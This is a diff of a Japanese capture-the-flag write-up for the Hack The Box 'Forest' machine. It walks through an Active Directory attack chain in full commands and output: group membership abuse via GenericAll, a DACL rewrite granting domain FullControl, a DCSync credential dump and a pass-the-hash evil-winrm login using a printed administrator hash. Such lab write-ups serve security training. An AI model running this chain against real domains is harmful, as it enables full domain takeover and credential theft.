@@ -132,43 +132,43 @@ LDAP        10.129.95.210   389    FOREST           Resolved collection methods:
 LDAP        10.129.95.210   389    FOREST           Done in 01M 58S
 LDAP        10.129.95.210   389    FOREST           Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2025-07-11_213653_bloodhound.zip
 ```
-svc-alfresoの上位グループは、「EXCHANGE WINDOWS PERMISSIONS」グループに対して、GenericAllを持つ  
-「EXCHANGE WINDOWS PERMISSIONS」グループは「HTB.LOCAL」に対してWriteDACLを持つ
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">  
-GenericAllを利用して、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加できた
+図から考えられる攻撃パスは
+1. genericall権限によりsvc-alfresoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加
+2. writedacl権限によりドメイン「htb.local」に対するフルコン権限をsvc-alfresoに付与
+3. dcsync攻撃によりadministratorのntハッシュ取得
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">
+
+genericall権限で、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加
 ```sh
-└─$ net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172 
+└─$ net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210 
                                                                                                                                  
-└─$ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172
+└─$ net rpc group members 'EXCHANGE WINDOWS PERMISSIONS' -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210 
 HTB\Exchange Trusted Subsystem
 HTB\svc-alfresco
 ```
-WriteDaclを利用して、「HTB.LOCAL」にフルコントロールを得ることができた  
-引き続き「DOMAIN ADMINS」にフルコントロールを得ようとしたが、「adminCount=1」とAdminSDHolderだったので先ほどのフルコンが役に立たなかった
+writedaclを利用して、「htb.local」に対するフルコントロールをsvc-alfrescoに付与  
 ```sh
-└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
+└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action write -rights FullControl 'htb.local/svc-alfresco:s3rvice'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
-[*] DACL backed up to dacledit-20250711-104639.bak
-[*] DACL modified successfully!
+[2025-08-17 17:46:32] [*] DACL backed up to dacledit-20250817-174632.bak
+[2025-08-17 17:46:33] [*] DACL modified successfully!
 
-└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc-alfresco' -target-dn 'CN=DOMAIN ADMINS,CN=USERS,DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
+└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action read 'htb.local/svc-alfresco:s3rvice'             
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
-[*] DACL backed up to dacledit-20250711-104751.bak
-[-] Could not modify object, the server reports insufficient rights: 00000005: SecErr: DSID-03152870, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+[2025-08-17 17:46:54] [*] Parsing DACL
+[2025-08-17 17:47:26] [*] Printing parsed DACL
+[2025-08-17 17:47:26] [*] Filtering results for SID (S-1-5-21-3072663084-364016917-1341370565-1147)
+[2025-08-17 17:47:26] [*]   ACE[116] info                
+[2025-08-17 17:47:26] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
+[2025-08-17 17:47:26] [*]     ACE flags                 : None
+[2025-08-17 17:47:26] [*]     Access mask               : FullControl (0xf01ff)
+[2025-08-17 17:47:26] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)
 ```
 次はDCSync攻撃を行うと、成功！
 ```sh
-└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] DACL backed up to dacledit-20250711-210233.bak
-[*] DACL modified successfully!
-
-└─$ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@10.129.191.172
+└─$ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@10.129.95.210
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -275,7 +275,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 ```
 administratorのハッシュでログイン成功！ルートフラグゲット
 ```powreshell
-└─$ evil-winrm -i 10.129.191.172 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 
+└─$ evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 
                                         
 Evil-WinRM shell v3.7
                                         
